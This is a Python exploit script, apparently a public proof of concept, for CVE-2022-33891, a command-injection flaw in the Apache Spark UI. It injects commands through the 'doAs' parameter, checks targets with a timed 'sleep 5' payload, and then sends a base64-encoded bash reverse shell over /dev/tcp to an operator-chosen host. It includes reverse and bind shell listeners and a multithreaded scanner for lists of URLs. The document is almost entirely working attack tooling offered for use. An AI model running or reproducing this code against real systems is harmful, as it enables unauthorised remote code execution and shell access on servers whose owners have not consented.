#!/bin/python3

import threading
import requests
import time
import base64
import argparse
import socket
import urllib3
from rich.console import Console
from concurrent.futures import ThreadPoolExecutor, as_completed
from alive_progress import alive_bar

def ascii_art():
    color.print("[bold bright_red]┏┓┓┏┏┓  ┏┓┏┓┏┓┏┓  ┏┓┏┓┏┓┏┓┓[/bold bright_red]")
    color.print("[bold bright_red]┃ ┃┃┣ ━━┏┛┃┫┏┛┏┛━━ ┫ ┫┣┫┗┫┃[/bold bright_red]")
    color.print("[bold bright_red]┗┛┗┛┗┛  ┗━┗┛┗━┗━  ┗┛┗┛┗┛┗┛┻[/bold bright_red]")
    print("Coded By: K3ysTr0K3R --> Too powerful LOLOL")
    print("")

color = Console()                     
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.0; rv:109.0) Gecko/20100101 Firefox/118.0',
    'Content-Type': 'application/x-www-form-urlencoded',
}

def start_bind_listener(bindaddress, bindport):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((bindaddress, int(bindport)))
    server.listen(1)
    color.print(f"[bold bright_blue][*][/bold bright_blue] Listening for bind shell on [bold bright_green]{bindaddress}[/bold bright_green][bold cyan]:[/bold cyan][bold bright_green]{bindport}[/bold bright_green]")
    client_socket, _ = server.accept()
    color.print("[bold bright_green][+][/bold bright_green] Shell opened successfully")
    try:
        while True:
            command = color.input("[bold cyan]Shell>[/bold cyan] ").strip()
            if command.lower() == 'exit':
                break
            if command:
                client_socket.send(command.encode() + b'\n')
                response = client_socket.recv(4096)
                print(response.decode('utf-8'), end='')
    except Exception:
        color.print(f"[bold bright_red][~][/bold bright_red] Connection closed")
    finally:
        client_socket.close()

def start_reverse_listener(lhost, lport):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', int(lport)))
    server.listen(1)
    color.print(f"[bold bright_blue][*][/bold bright_blue] Listening for reverse shell on [bold bright_green]{lhost}[/bold bright_green][bold cyan]:[/bold cyan][bold bright_green]{lport}[/bold bright_green]")
    client_socket, _ = server.accept()
    color.print("[bold bright_green][+][/bold bright_green] Shell opened successfully")
    try:
        while True:
            command = color.input("[bold cyan]Shell>[/bold cyan] ").strip()
            if command.lower() == 'exit':
                break
            if command:
                client_socket.send(command.encode() + b'\n')
                response = client_socket.recv(4096)
                print(response.decode('utf-8'), end='')
    except Exception:
        color.print(f"[bold bright_red][~][/bold bright_red] Connection closed")
    finally:
        client_socket.close()

def exploit(target, lhost, lport, bindaddress=None, bindport=None):
    start_time = time.time()
    data = 'doAs=`echo c2xlZXAgNQo= | base64 -d | bash`'
    color.print("[bold bright_blue][*][/bold bright_blue] Checking if the target is vulnerable")
    try:
        requests.post(target, headers=headers, data=data, verify=False)
        end_time = time.time()
        execution_time = end_time - start_time
        if execution_time >= 5:
            color.print("[bold bright_green][+][/bold bright_green] The target appears to be vulnerable")
            color.print(f"[bold bright_blue][*][/bold bright_blue] Starting exploit against: [bold cyan]{target}[/bold cyan]")
            color.print("[bold bright_blue][*][/bold bright_blue] Deploying payload for reverse shell")
            if bindaddress and bindport:
                bind_listener_thread = threading.Thread(target=start_bind_listener, args=(bindaddress, bindport))
                bind_listener_thread.start()
            if lhost and lport:
                listener_thread = threading.Thread(target=start_reverse_listener, args=(lhost, lport))
                listener_thread.start()
                payload = f"bash -c '0<&26-;exec 26<>/dev/tcp/{lhost}/{lport};sh <&26 >&26 2>&26'"
                encode = payload.encode('utf-8')
                encode_proc = base64.b64encode(encode)
                encoded_payload = encode_proc.decode('utf-8')
                send_payload = 'doAs=`echo ' + encoded_payload + ' | base64 -d | bash`'
                requests.post(target, headers=headers, data=send_payload, verify=False)
        else:
            color.print("[bold bright_red][/bold bright_red] The target does not appear to be vulnerable")
            exit()
    except requests.exceptions.ConnectionError:
        color.print("[bold bright_red][/bold bright_red] The target does not appear to be vulnerable")
        exit()

def scanner(target):
    start_time = time.time()
    data = 'doAs=`echo c2xlZXAgNQo= | base64 -d | bash`'
    try:
        requests.post(target, headers=headers, data=data, verify=False)
        end_time = time.time()
        execution_time = end_time - start_time
        if execution_time >= 5:
            color.print(f"[bold bright_green][+][/bold bright_green] The target is vulnerable - [bold cyan]{target}[/bold cyan]")
    except Exception:
        pass

def scan_file(target_file, threads):
    with open(target_file, "r") as url_file:
        urls = [url.strip() for url in url_file]
        if not urls:
            return

        completed_tasks = []
        failed_tasks = []

        with alive_bar(
            len(urls), title="Scanning Targets", bar="smooth", enrich_print=False
        ) as bar:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                future_to_url = {
                    executor.submit(scanner, url): url for url in urls
                }
                for future in as_completed(future_to_url):
                    url = future_to_url[future]
                    try:
                        future.result()
                        completed_tasks.append(url)
                    except Exception:
                        failed_tasks.append((url))
                    bar()

def main():
    ascii_art()
    parser = argparse.ArgumentParser(description='A PoC exploit for CVE-2022-33891 - Apache Spark UI Remote Code Execution (RCE)')
    parser.add_argument('-u', '--url', help='Target URL to exploit')
    parser.add_argument('-f', '--file', help='File containing URLs to scan')
    parser.add_argument('-t', '--threads', help='Set the amount of threads needed for scanning')
    parser.add_argument('-lh', '--lhost', help='Local host for reverse shell')
    parser.add_argument('-lp', '--lport', help='Local port for reverse shell')
    parser.add_argument('-ba', '--bindaddress', help='Bind address for bind shell (Optional)', required=False)
    parser.add_argument('-bp', '--bindport', help='Bind port for bind shell (Optional)', required=False)
    
    args = parser.parse_args()
    if args.url and args.lhost and args.lport:
        exploit(args.url, args.lhost, args.lport, args.bindaddress, args.bindport)
    elif args.file:
        scan_file(args.file, int(args.threads or 1))
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
